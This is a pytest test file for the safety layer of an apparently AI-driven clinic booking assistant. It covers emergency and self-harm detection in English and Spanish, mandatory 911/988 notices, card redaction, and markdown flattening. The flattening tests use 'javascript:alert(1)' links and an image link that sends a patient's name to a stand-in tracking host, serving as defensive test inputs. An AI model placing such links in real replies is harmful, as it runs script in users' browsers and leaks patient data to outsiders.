"""The emergency floor and card redaction hold on every exit path and every channel, whatever the model does."""
import pytest
from conftest import SARAH, Response, run_turn, text, tool, verified

import agent
import safety

CHEST = "I need to book a visit, also my chest pain started an hour ago"


@pytest.mark.parametrize("message", [
    CHEST, "I can't breathe well", "tengo dolor de pecho", "me desmayé hoy", "No puedo respirar bien",
    "pienso en quitarme la vida",
    # from the 2026-11-20 checkpoint review
    "I can\u2019t breathe", "I cannot breathe", "I think it's a heart attack", "my chest hurts", "I want to die",
    "I keep wanting to hurt myself", "he fainted at lunch", "I'm coughing up blood", "creo que es un infarto",
    "ataque al corazón", "me duele el pecho", "me quiero morir", "no respiro",
])
def test_emergency_pattern_english_and_spanish(message):
    assert safety.is_emergency(message)


@pytest.mark.parametrize("message", ["I need a refill", "Book me for a skin check", "What are your hours?"])
def test_no_false_alarm(message):
    assert not safety.is_emergency(message)


@pytest.mark.parametrize("channel", ["web", "sms", "voice", "portal"])
@pytest.mark.parametrize("script", [
    [text("Sure, which day works for you?")],              # model forgets the emergency
    [text("")],                                              # empty reply
    [Response([], "end_turn")],                              # no content at all
    [Response([], "refusal")],                               # refused
    [text("Booking now", stop="max_tokens")],               # cut off
    [RuntimeError("API down")],                              # API exception
])
def test_notice_on_every_exit_path(fake_model, channel, script):
    fake_model(*script)
    s = {"channel": channel, "patient_id": None, "failed_verifications": 0, "messages": []}
    reply, _ = run_turn(CHEST, s)
    assert safety.emergency_notice(channel) in reply
    assert "**" not in reply and "⚠" not in reply  # plain text on every channel


def test_notice_after_loop_cap(fake_model, monkeypatch):
    monkeypatch.setattr(agent, "MAX_LOOP_ITERATIONS", 3)
    fake_model(*[tool("get_availability", specialty="Primary Care") for _ in range(3)])
    s = {"channel": "web", "patient_id": None, "failed_verifications": 0, "messages": []}
    reply, _ = run_turn(CHEST, s)
    assert "911" in reply and "problem processing" in reply


@pytest.mark.parametrize("model_reply", ["Please call 911 now.", "You don't need to call 911 for this.",
                                         "Your appointment APT-2911 is booked."])
def test_code_notice_always_comes_first(fake_model, model_reply):
    """No reply text can suppress the notice (an unanchored '911' check used to)."""
    fake_model(text(model_reply))
    s = {"channel": "web", "patient_id": None, "failed_verifications": 0, "messages": []}
    reply, _ = run_turn(CHEST, s)
    assert reply.startswith(safety.EMERGENCY_NOTICES["web"]) and reply.count(safety.EMERGENCY_NOTICES["web"]) == 1


def test_self_harm_always_gets_988(fake_model):
    fake_model(text("Please call 911 right away."))
    s = {"channel": "sms", "patient_id": None, "failed_verifications": 0, "messages": []}
    reply, _ = run_turn("I want to hurt myself", s)
    assert "988" in reply


@pytest.mark.parametrize("channel", ["web", "sms", "voice"])
def test_spanish_trigger_gets_spanish_notice(channel):
    assert safety.emergency_notice(channel, "me duele el pecho") == safety.EMERGENCY_NOTICES_ES[channel]
    assert safety.emergency_notice(channel, "my chest hurts") == safety.EMERGENCY_NOTICES[channel]


@pytest.mark.parametrize("reply, banned", [
    ("Click [here](javascript:alert(1)) to reset", "javascript"),
    ("![x](https://evil.example/track?q=maria)", "evil.example"),
    ("See [portal][1]\n\n[1]: javascript:alert(1)", "javascript"),
])
def test_markdown_links_and_images_are_flattened(reply, banned):
    flat = safety.flatten_markdown_links(reply)
    assert banned not in flat and "](" not in flat


def test_https_link_keeps_its_address_as_text():
    flat = safety.flatten_markdown_links("Reset it at [MySierra](https://mysierra.example.org/reset)")
    assert flat == "Reset it at MySierra (https://mysierra.example.org/reset)"


def test_transcript_stays_valid_after_cutoff(fake_model):
    """A max_tokens turn with a half-written tool call must not leave an unanswered tool_use behind."""
    from conftest import Block
    cut = Response([Block("text", text="Let me"), Block("tool_use", name="list_appointments", id="toolu_x")], "max_tokens")
    fake_model(cut)
    s = verified(*SARAH)
    run_turn("show my appointments", s)
    last = s["messages"][-1]
    assert last["role"] == "assistant" and isinstance(last["content"], str)


def test_card_numbers_never_reach_the_model(fake_model):
    client = fake_model(text("I removed that for your security."))
    s = {"channel": "web", "patient_id": None, "failed_verifications": 0, "messages": []}
    run_turn("my card is 4111 1111 1111 1111 exp 12/29", s)
    sent = str(client.calls[0]["messages"])
    assert "4111" not in sent and safety.CARD_REDACTED in sent


def test_non_card_numbers_survive():
    assert safety.redact_payment_details("call 5553014000 about APT-2002") == "call 5553014000 about APT-2002"
